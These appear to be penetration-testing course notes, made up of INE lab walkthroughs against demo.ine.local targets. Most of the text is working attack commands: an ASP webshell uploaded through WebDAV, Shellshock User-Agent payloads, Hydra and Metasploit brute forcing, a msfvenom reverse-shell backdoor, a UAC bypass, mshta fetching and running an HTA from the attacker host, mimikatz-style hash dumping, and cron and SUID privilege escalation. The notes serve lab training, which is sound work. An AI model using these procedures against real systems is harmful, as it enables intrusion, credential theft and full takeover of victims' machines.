    // found the webdav directory also received 401 error i.e Unauthorized.
    
    **davtest** -url http://demo.ine.local/webdav
    
    //We can notice, /webdav path is secured with basic authentication. We have the credentials access the /webdav path using the provided credentials i.e bob:password_123321.
    
    davtest -auth **bob:password_123321** -url http://demo.ine.local/webdav
    
    //webdav directory. Also, we can execute three types of files. i.e asp, text, and html.
    //Upload a .asp backdoor on the target machine to /webdav directory using cadaver utility.
    //The .asp backdoor present in “/usr/share/webshells/asp/” directory. i.e /usr/share/webshells/asp/webshell.asp
    
    **cadaver** http://demo.ine.local/webdav
    **put** /usr/share/webshells/asp/webshell.asp
    ls
    
    **Access the backdoor using the firefox browser.
    URL: http://demo.ine.local/webdav
    Enter credentials: bob:password_123321
    We can enter Windows commands in the text-box input field
    
    URL: http://demo.ine.local/webdav/webshell.asp
    URL: http://demo.ine.local/webdav/webshell.asp?cmd=whoami
    //We are running as an IIS apppool.
    //check C:\ drive
    URL: http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
    URL: http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
    
    ```
    
    …**DAVTest**
    
    Purpose: Used for testing WebDAV-enabled servers.
    
    Function: Uploads test files (scripts, executables, etc.) to check if the server allows execution.
    
    Usage: Helps attackers/pentesters find file upload and execution vulnerabilities.
    
    Example: davtest -url [http://target.com/dav/](http://target.com/dav/)
    
    …**Cadaver**
    
    Purpose: A command-line WebDAV client (like FTP client but for WebDAV).
    
    Function: Allows you to browse, upload, download, and manage files on a WebDAV server.
    
    Usage: Helpful for both administration and penetration testing.
    
    Example: cadaver [http://target.com/dav/](http://target.com/dav/)
    
- **Shellshock**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** Exploit the vulnerability and execute arbitrary commands on the target machine.
    
    Tools: Nmap, BurpSuite
    
    ```bash
    nmap demo.ine.local
    http://demo.ine.local
    //view page source and got /gettime.cgi
    nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
    
    //vulnerable to shellshock attack
    URL: https://github.com/opsxcq/exploit-CVE-2014-6271
    
    burpsuite:
    
    Configure Firefox to use Burp Suite. Click on the FoxyProxy plugin icon on the top-right of the browser and select "Burp Suite."
    Start Burp Suite, navigate to proxy, and turn on the intercept.
    Reload the page and intercept the request with Burp Suite.
    Right-click and select “Send to Repeater” Option and Navigate to the Repeater tab.
    Modify the User-Agent and inject the malicious payload.
    
    User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
    User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
    modify
    User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
    
    ```
    
- **Web App Vulnerability Scanning With WMAP**
    
    This lab covers the process of performing web app vulnerability scanning with the WMAP Metasploit extension.
    
    The WMAP extension is typically used to automate the process of performing web server enumeration and also automates the process of identifying misconfigurations and vulnerabilities on a web server.
    
    Pre-requisites: 
    
    1. Basic familiarity with Nmap.
    2. Basic Familiarity with Metasploit.
    
    ```bash
    ifconfig
    //eth1: Kali Linux IP is 192.249.3.2 so the target IP will be 192.249.3.3.
    
    msfconsole
    load wmap
    wmap_sites -a 192.249.3.3
    wmap_targets -t http://192.249.3.3
    wmap_sites -l
    wmap_targets -l
    wmap_run -t
    wmap_run -e
    
    ```
    
- **CTF 1**
    
    In this lab environment, you will have access to a target machine available at **http://target.ine.local**. Additionally, a Nessus dashboard is set up for vulnerability scanning and can be accessed via **https://localhost:8834/**. Use the provided credentials to log into the Nessus dashboard for further analysis.
    
    **Credentials:**
    
    ```
    Username: admin
    Password: adminpasswd
    ```
    
    **Objective:** Identify the services running on the machine, perform a detailed vulnerability scan, and capture all the flags hidden within the environment.
    
    **Flags to Capture:**
    
    - **Flag 1**: Explore hidden directories for version control artifacts that might reveal valuable information.
    - **Flag 2**: The data storage has some loose security measures. Can you find the flag hidden within it?
    - **Flag 3**: A PHP file that displays server information might be worth examining. What could be hidden in plain sight?
    - **Flag 4**: Sensitive directories might hold critical information. Search through carefully for hidden gems.
    
    Tools: Nmap , Nessus
    
    ```bash
    
    **Flag1:**
    
    nmap -sC -sV target.ine.local --script vuln --min-rate 1000
    //--script vuln reveal .git directory
    http://target.ine.local/.git/
    
    **Flag2**
    
    //from nmap scann /phpmyadmin hidden internal files in data storage
    
    http://target.ine.local/phpmyadmin
    //flag in mysql database in manul search and got secret_info got the flag
    
    **Flag3**
    //during nmap scan http-enum contains phpinfo.php
    
    http://target.ine.local/phpinfo.php
    
    **Flag4**
    
    //in nmap can http_enum indicates passwords directory
    
    http://target.ine.local/passwords
    
    ```
    

- **Scripts@**
    1. CVE
    2. CVSS 
    3. Case studies 
    - Heartbleed `nmap -sV --script ssl-heartbleed -p 443 <TARGET>`
    - EthernalBlue `nmap --script smb-vuln-ms17-010 -p 445 <TARGET>`
    - BlueKeep
    - Log4j `nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_HOST>`
    1. Exploit-db 
    2. searchsploit 
    3. Ref: Ref: [https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va)
    

# Host and Network Auditing 25%

**Q.**

- **Compile information from files on target**
- **Enumerate network information from files on target**
- **Enumerate system information on target**
- **Gather user account information on target**
- **Transfer files to and from target**
- **Gather hash/password information from target**

- **Scripts@**
    1. Cyber security Basics 
    2. CIA Traid
    3. Defense in Depth
    4. Compliance 
    5. Frameworks & Maturity
    6. Auditing
    7. Asset management - Nmap & Nessus 

# Host and Network Penetration Testing 35%

**Q.** 

- **Identify and modify exploits**
- **Conduct exploitation with metasploit**
- **Demonstrate pivoting by adding a route and by port forwarding**
- **Conduct brute-force password attacks and hash cracking**

- ***System/Host based Attacks***
    
    **Labs:**
    
    - **Windows:IIS Server DAVTest**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the WebDAV service and retrieve the flag!
        
        **The following username and password may be used to access the service:**
        
        | Username | Password | | bob | password_123321 |
        
        Tools: DAVTest, Cadaver , ASP Webshell
        
        ```bash
        
        nmap demo.ine.local
        nmap --script http-enum -sV -p 80 demo.ine.local
        davtest -url http://demo.ine.local/webdav
        davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
        cadaver http://demo.ine.local/webdav
        put /usr/share/webshells/asp/webshell.asp
        ls
        
        URL: http://demo.ine.local/webdav
        http://demo.ine.local/webdav/webshell.asp
        http://demo.ine.local/webdav/webshell.asp?cmd=whoami
        URL: http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
        URL: http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
        
        ```
        
    - **Windows IIS Server: WebDav Metasploit**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the WebDAV service and retrieve the flag!
        
        **The following username and password may be used to access the service:**
        
        | Username | Password | | bob | password_123321 |
        
        Tools: Metasploit, DAVTest, Cadaver
        
        ```bash
        nmap demo.ine.local
        nmap --script http-enum -sV -p 80 demo.ine.local
        davtest -url http://demo.ine.local/webdav
        davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
        
        msfconsole -q
        use exploit/windows/iis/iis_webdav_upload_asp
        set RHOSTS demo.ine.local
        set HttpUsername bob
        set HttpPassword password_123321
        set PATH /webdav/metasploit%RAND%.asp
        exploit
        
        shell
        cd /
        dir
        type flag.txt
        
        ```
        
    - **Windows : SMB Server PSexec**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the SMB service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. You need to find valid credentials to access the SMB service and abuse the service with available SMB Metasploit exploitation modules.
        
        **Objective:** Exploit the SMB service to get a meterpreter session on the target and retrieve the flag!
        
        Tools: Metasploit Framework, Nmap
        
        ```bash
        nmap demo.ine.local
        nmap -p445 --script smb-protocols demo.ine.local
        
        msfconsole -q
        use auxiliary/scanner/smb/smb_login
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set RHOSTS demo.ine.local
        set VERBOSE false
        exploit
        
        msfconsole -q
        use exploit/windows/smb/psexec
        set RHOSTS demo.ine.local
        set SMBUser Administrator
        set SMBPass qwertyuiop
        exploit
        
        shell
        cd /
        dir
        type flag.txt
        ```
        
    - **Windows: Insecure RDP Service**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at **demo.ine.local** running a vulnerable RDP service.
        
        **Objective:** To fingerprint the running RDP service, then exploit the vulnerability using the appropriate method and retrieve the flag!.
        
        **Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.
        
        **Dictionaries to use:**
        
        - /usr/share/metasploit-framework/data/wordlists/common_users.txt
        - /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        
        Tools: Nmap, searchsploit, msfconsole,xfreerdp
        
        ```bash
        ping -c 4 demo.ine.local
        nmap -sV demo.ine.local
        //auxiliary module on port 3333 if it’s running RDP
        
        msfconsole
        use auxiliary/scanner/rdp/rdp_scanner
        set RHOSTS demo.ine.local
        set RPORT 3333
        exploit
        
        hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333
        
        xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
        
        Got to “My Computer” → C:\
        
        Open flag file.
        
        ```
        
    - **WinRM: Exploitation with Metasploit**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the **WinRM (Windows Remote Management)** service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework exploit and auxiliary modules.
        
        **Objective:** Exploit the WinRM service to get a meterpreter on the target and retrieve the flag!
        
        Tools: Metasploit Framework, Nmap
        
        **CrackMapExec:** 
        
        - A **post-exploitation & enumeration tool** for **Windows/Active Directory**.
        - Helps pentesters check **credentials, shares, SMB, RDP, WinRM, MSSQL, etc.**
        - Often called the **Swiss Army knife for pentesting Windows networks**.
        
        ### Evil-WinRM?
        
        - A **Ruby-based WinRM shell** tool.
        - Used by pentesters to **connect to Windows machines over WinRM (5985/5986)** once you have valid credentials.
        - It gives you a **PowerShell session** on the target → great for post-exploitation.
        
        ```bash
        nmap --top-ports 7000 demo.ine.local
        
        //By default WinRM service uses port 5985 for HTTP. We will run the metasploit winrm_login module to find the valid users and their passwords.
        
        msfconsole -q
        use auxiliary/scanner/winrm/winrm_login
        set RHOSTS demo.ine.local
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set VERBOSE false
        set PASSWORD anything
        exploit
        
        use auxiliary/scanner/winrm/winrm_auth_methods
        set RHOSTS demo.ine.local
        exploit
        
        use auxiliary/scanner/winrm/winrm_cmd
        set RHOSTS demo.ine.local
        set USERNAME administrator
        set PASSWORD tinkerbell
        set CMD whoami
        exploit
        
        use exploit/windows/winrm/winrm_script_exec
        set RHOSTS demo.ine.local
        set USERNAME administrator
        set PASSWORD tinkerbell
        set FORCE_VBS true
        exploit
        
        cd /
        dir
        cat flag.txt
        ```
        
    - **UAC Bypass: UACMe***
        
        UAC: User Account Control
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable server will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. And then, bypass UAC using the UACME tool.
        
        **Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.
        
        **Note:** The UACMe tool is located in **"/root/Desktop/tools/UACME/"** directory.
        
        Tools: Nmap , msf, UACME
        
        ```bash
        
        ping -c 4 demo.ine.local
        nmap demo.ine.local
        nmap -sV -p 80 demo.ine.local
        //HTTP File Server (HFS) 2.3 is available.
        searchsploit hfs
        
        msfconsole -q
        
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit
        
        getuid
        sysinfo
        ps -S explorer.exe
        migrate 2332
        getsystem
        shell
        net localgroup administrators
        //access denied administrator
        //admin to NT auth need bypass UAC for admin with the help of UACMe tool
        
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
        file backdoor.exe
        
        CTRL + C
        cd C:\\Users\\admin\\AppData\\Local\\Temp
        upload /root/Desktop/tools/UACME/Akagi64.exe .
        upload /root/backdoor.exe .
        ls
        
        msfconsole -q
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 10.10.31.2
        set LPORT 4444
        exploit
        
        shell
        Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
        ps -S lsass.exe
        migrate 496
        hashdump
        ```
        
    - **Privilege Escalation: Impersonate**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Escalate the privilege on a Windows machine.
        
        Tools: Nmap , Metasploit Framework
        
        `NT AUTHORITY\SYSTEM` often succeeds because SYSTEM tokens are local, privileged, and commonly exposed by services; an Administrator account’s token may be absent, filtered (UAC), tied to a different session, or otherwise not duplicable/usable for impersonation.
        
        ```bash
        nmap demo.ine.local
        nmap -sV -p 80 demo.ine.local
        searchsploit hfs
        
        msfconsole -q
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit 
        getuid 
        
        cat C:\\Users\\Administrator\\Desktop\\flag.txt
        //access denied for Administrator
        
        load **incognito**         //to check available token
        list_tokens -u
        
        **impersonate_token** ATTACKDEFENSE\\Administrator 
        getuid
        impersonate_token **NT AUTHORITY\SYSTEM**
        cat C:\\Users\\Administrator\\Desktop\\flag.txt
        
        got flag.txt
        ```
        
    - **Unattended Insallation**
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a Windows machine.
        
        Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations. The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework has been provided to you on the Windows machine.
        
        **Objective:** Gain access to meterpreter session with high privilege.
        
        Tools: PowerUp.ps1, Metasploit Framework, Powershell
        
        ```bash
        Step 1: Switch to Attacker Machine for locating a privilege escalation vulnerability.
        Step 2: Open powershell.exe terminal to check the current user.
        We are running as a student user. The PowerSploit framework and Powerup.ps1 scripts are provided.
        Step 3: We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability.
        Command:
        cd .\Desktop\PowerSploit\Privesc\
        ls
        
        Step 4: Import PowerUp.ps1 script and Invoke-PrivescAudit function.
        
        powershell -ep bypass (PowerShell execution policy bypass)
        . .\PowerUp.ps1
        Invoke-PrivescAudit
        
        cat C:\Windows\Panther\Unattend.xml
        We have discovered an administrator encoded password. i.e “QWRtaW5AMTIz”.
        Step 6: Decoding administrator password using Powershell.
        
        $password='QWRtaW5AMTIz'
        $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
        ssword))
        echo $password
        The administrator password is “Admin@123”.
        
        Step 7: We are running a command prompt as an administrator user using discover credentials.
        
        runas.exe /user:administrator cmd
        Admin@123
        whoami
        
        We are running cmd.exe as an administrator.
        Switch to the Kali Machine.
        Step 8: Running the hta_server module to gain the meterpreter shell. Start msfconsole.
        Commands:
        
        msfconsole -q
        use exploit/windows/misc/hta_server
        exploit
        
        mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
        sessions -i 1
        cd /
        cd C:\\Users\\Administrator\\Desktop
        dir
        cat flag.txt
        
        ```
        
    - **Windows: Meterpreter: Kiwi Extension**
        
        The Meterpreter Kiwi plugin is an advanced post-exploitation tool within the Metasploit Framework, specifically designed for interacting with and extracting sensitive data from compromised Windows systems. Kiwi is an extension of the Meterpreter payload and incorporates features from Mimikatz, a well-known post-exploitation tool used for extracting passwords, hashes, and other credentials from Windows systems. In this lab, we will explore the meterpreter Kiwi plugin to extract sensitive data from the target machine.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module. Then, use the meterpreter Kiwi plugin to extract sensitive data from the target's machine.
        
        **Objective:** Exploit the application and find all the flags:
        
        - Find Administrator and Student users NTLM hash.
        - Dump LSA secrets to find Syskey
        
        Tools: Nmap , Metasploit Framework
        
        ```bash
        nmap demo.ine.local
        nmap -sV -p 80 demo.ine.local
        searchsploit badblue 2.7
        
        msfconsole -q
        use exploit/windows/http/badblue_passthru
        set RHOSTS demo.ine.local
        exploit
        
        ps
        pgrep lsass.exe
        migrate (number)
        
        or
        migrate -N lsass.exe
        load kiwi
        hashdump              //got Administrator and studnent NTLM hashes
        or
        creds_all
        lsa_dump_sam
        lsa_dump_secrets
        or 
        run windows/gather/smart_hashdump   //got syskey
        ```
        
        In this lab, we exploited a vulnerable application using metasploit to gain shell access on the target and then used the meterpreter Kiwi plugin to extract sensitive data from the target machine.
        
    - **CTF:01**
        
        In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.
        
        **Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.
        
        **Useful files:**
        
        ```
        /usr/share/metasploit-framework/data/wordlists/common_users.txt,
        /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
        /usr/share/webshells/asp/webshell.asp
        ```
        
        **Flags to Capture:**
        
        - **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
        - **Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
        - **Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
        - **Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)
        
        Tools:
        
        Nmap, Hydra, Cadaver, Metasploit Framework
        
        ```bash
        
        **//Flag1**
        
        nmap demo.ine.local
        nmap -p445 --script smb-protocols demo.ine.local
        
        msfconsole -q
        use auxiliary/scanner/smb/smb_login
        set SMBUser bob
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set RHOSTS target1.ine.local
        set VERBOSE false
        exploit
        //got bob:password_123321
        
        http://target1.ine.local/**webdav**
        /got flag1.txt
        
        **//Flag2**
        
        davtest -url http://target1.ine.local/webdav
        davtest -auth bob:password_123321 -url http://target.ine.local/webdav
        //find out which file can be submitted
        
        **cadaver** http://target1.ine.local/webdav
        user:bob, pass: password_123321
        dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
        //file upload using cadaver
        //access the backdoor
        http://target1.ine.local/webdav/webshell.asp
        command: type C:\**flag2.txt**
        
        **//Flag3**
        service postgresql start && msfconsole
        //msfconsole
        
        search smb_login
        use auxiliary/scanner/smb/smb_login
        set RHOSTS target2.ine.local
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set VERBOSE false
        exploit - cred found
        
        [psexec.py](http://psexec.py/) [Administrator@10.4.16.36](mailto:Administrator@10.4.16.36) cmd.exe`
        
        msfconsole
        search psexec
        use exploit/windows/smb/psexec
        set RHOSTS target2.ine.local
        set SMBUser Administrator
        set SMBPass pineapple
        exploit
        
        meterpreter>getuid, sysinfo
        cd C:\
        type flag3.txt
        
        **//Flag4**
        
        meterpreter>cd C:\
        cd Users
        cd Administrator
        cd Desktop
        type flag4.txt
        
        ```
        
    - **Shellshock**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the vulnerability and execute arbitrary commands on the target machine.
        
        Tools: Nmap, Burpsuite
        
        ```bash
        nmap -sV demo.ine.local
        Browse: http://demo.ine.local
        //got gettime.cgi
        vuln check: 
        nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local
        //The server is vulnerable to Shellshock attack.
        
        **manually::**
        http://demo.ine.local/gettime.cgi
        //open burpsuite and send to repeater
        User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
        User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
        User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
        
        ```
        
    - **ProFTP Recon:Basics**
        
        ProFTPd is an open-source FTP server that is highly configurable and designed to be secure, efficient, and easy to manage. It is commonly used in Unix-like operating systems and supports various configurations and authentication methods. In this lab, we will look at the basics of ProFTP server reconnaissance.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Answer the following questions:
        
        1. What is the version of FTP server?
        2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
        3. Find the password of user “sysadmin” using nmap script.
        4. Find seven flags hidden on the server.
        
        Tools: Nmap, Hydra
        
        ```bash
        nmap -sV demo.ine.local
        //got version ProFTPD for ftp
        **hydra** -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp
        
        ## got info: sysadmin: 654321
        rooty: qwerty
        demo: butterfly
        **auditor: chocolate**
        anon: purple
        administrator: tweety
        diag: tigger ##
        
        ftp demo.ine.local
        username: auditor
        pass: chocolate
        ftp>dir
        ftp>mget flag.txt
        
        $cat flag.txt
        
        or
        
        echo "sysadmin" > users
        nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
        ftp demo.ine.local
        Enter username "sysadmin" and password 654321
        ls
        get secret.txt
        exit
        cat secret.txt
        ```
        
        In this lab, we learned about the basics of ProFTP server reconnaissance.
        
    - **SSH Login**
        
        SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.
        
        In this lab, we will look at a couple of SSH related metasploit modules and run them against the target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running an SSH service will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to run the following auxiliary modules against the target:
        
        - auxiliary/scanner/ssh/ssh_version
        - auxiliary/scanner/ssh/ssh_login
        
        The following username and password dictionary will be useful: - /usr/share/metasploit-framework/data/wordlists/common_users.txt - /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
        
        Tools: nmap, metasploit framework
        
        ```bash
        nmap -sS -sV demo.ine.local
        msfconsole
        use auxiliary/scanner/ssh/ssh_version
        set RHOSTS demo.ine.local
        exploit
        
        use auxiliary/scanner/ssh/ssh_login
        set RHOSTS demo.ine.local
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
        set STOP_ON_SUCCESS true
        set VERBOSE true
        exploit                   //got sysadmin:ha
        
        sessions               //after exploit sessions created and no meterpreter come but command here 
        sessions -i 1
        find / -name "flag"
        cat /flag
        
        **or another way::::not prefer**
        hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ssh
        ssh sysadmin@demo.ine.local
        pass:haily not sure got from msf or hydra
        
        sysadmin@demo:$ whoami
        sysadmin@demo:$ls -la
        sysadmin@demo:$cat /etc/passwd
        sysadmin@demo:$find / -name "flag"
        sysadmin@demo:$cat /flag
        
        ```
        
    - **Samba Recon: Dictionary Attack**
        
        SMB (Server Message Block) is a network file sharing protocol that allows applications and users to read and write to files and request services from server programs in a computer network. In this lab we will look at the dictionary attack on SMB server.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Answer the following questions:
        
        1. What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
        2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
        3. Which share is read only? Use smbmap with credentials obtained in question 2.
        4. Is share “jane” browseable? Use credentials obtained from the 1st question.
        5. Fetch the flag from share “admin”
        6. List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2.
        7. List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2
        
        **Tools: smbmap, msf, enum4linux, smbclient, hydra**
        
        ```bash
        nmap -Pn -sV -O demo.ine.local
        //version: **samba 139 &445 smb**
        msfconsole -q
        use auxiliary/scanner/smb/smb_login
        set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
        set SMBUser jane
        set RHOSTS demo.ine.local
        exploit
        //jane:abc123
        
        gzip -d /usr/share/wordlists/rockyou.txt.gz
        hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
        or
        hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
        
        smbmap -H demo.ine.local -u admin -p password1
        smbclient -L demo.ine.local -U jane
        smbclient //demo.ine.local/jane -U jane
        
        smbclient //demo.ine.local/admin -U admin
        ls
        cd hidden
        ls
        get flag.tar.gz
        exit
        tar -xf flag.tar.gz
        **cat flag**
        
        msfconsole -q
        use auxiliary/scanner/smb/pipe_auditor
        set SMBUser admin
        set SMBPass password1
        set RHOSTS demo.ine.local
        exploit
        
        enum4linux -r -u "admin" -p "password1" demo.ine.local
        ```
        
        In this lab, we learned about the dictionary attack on SMB server.
        
    - **Cron Jobs Gone Wild II**
        
        A **cron job** is a **scheduled task** in Linux/Unix systems.
        
        It uses the **cron daemon** to run commands or scripts automatically at specific times or intervals.
        
        **Cron** = the background service (scheduler).
        
        **Crontab** = the file where jobs are defined.
        
        **Cron job** = one entry/command in the crontab.
        
        Cron is a lifesaver for admins when it comes to doing periodic maintenance tasks on the system. They can even be used in cases where tasks are performed within individual user directories. However, such automations need to be used with caution or can lead to easy privilege escalation attacks.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. A terminal access to the target machine is provided at target.ine.local:8000, which you can access over the browser in Kali.
        
        **Objective:** Your mission is to get a root shell on the box and retrieve the flag!
        
        Tools: **nmap, browser(firefox)**
        
        **Port 8000 = service endpoint.**
        
        **Cron job = scheduler that could manage or interact with that service.**
        So, if a service on **port 8000** always restarts at a specific interval (say every 5 minutes), or logs show entries from `cron`, you can be pretty sure it’s triggered by a cron job.
        
        ```bash
        
        http://target.ine.local:8000
        ls -l
        find / -name message
        ls -l /tmp/
        //Observe that a file with the same name is present in the /tmp directory. On checking closely, it is clear that this file is being overwritten every minute.
        
        grep -nri "/tmp/message" /usr
        ls -l /usr/local/share/copy.sh
        cat /usr/local/share/copy.sh
        vim /usr/local/share/copy.sh
        vi /usr/local/share/copy.sh
        nano /usr/local/share/copy.sh
        
        printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
        //no editor, Use printf to replace the original code with the following lines.
        cat /usr/local/share/copy.sh
        sudo -l
        //Note: You might have to wait for 1 minute (i.e. the cron job runs every 1 minute) and check the sudoers list again. This time new entry is there.
        sudo su
        cd /root
        ls -l
        cat flag
        
        ```
        
    - **Exploiting Setuid Programs**
        
        In this lab environment, you will be provided with GUI access to a Kali machine. A terminal access to the target machine is provided at **target.ine.local:8000**, which you can access over the browser in Kali.
        
        On the target machine, you are provided a regular user account and need to escalate your privileges to become root. There are 2 programs in the home directory **welcome** and **greetings** which might be vulnerable.
        
        **Objective:** Your task is to -
        
        1. Get a root shell on the system
        2. View /etc/shadow
        3. Retrieve the flag.
        
        **Tools: Firefox**
        
        **SUID** (Set User ID) is a special type of file permission in Linux and Unix-like systems. When an executable file has the SUID bit set, it **runs with the privileges of the file's owner**, not the privileges of the user who executed it.
        
        This is a powerful feature, primarily used to allow regular users to perform specific tasks that normally require root (administrator) privileges.
        
        ```bash
        ping -c 4 target.ine.local
        ls -l
        //Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges. Check the file type.
        
        file welcome
        //It is an ELF binary. And on execution, it shows a welcome message.
        // Investigate the binary. The most easy or preliminary way of doing that is to use strings command.
        
        strings welcome
        
        // Observe the greetings strings in the output of the strings command. It is possible that welcome binary is calling greetings binary. So, replace the greetings binary with some other binary (say /bin/bash) which should then also get executed as root.
        //Delete greetings binary and then copy /bin/bash to its location and rename that to greetings.
        
        rm greetings
        cp /bin/bash greetings
        ./welcome
        cd /root
        ls
        cat flag
        ```
        
    - **Password Cracker: Linux**
        
        Auxiliary modules in the Metasploit Framework are versatile components used to perform a wide range of tasks that do not necessarily involve exploiting a vulnerability. These tasks can include scanning, enumeration, fuzzing, cracking hashes, and other network-related activities. Auxiliary modules are an essential part of the penetration testing process as they help gather information, identify potential targets, and assess the security posture of systems and networks.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        **Objective:** Run the following auxiliary module against the target:root Password
        
        - auxiliary/analyze/crack_linux
        
        Tools: nmap , msf
        
        ```bash
        ping -c 4 demo.ine.local
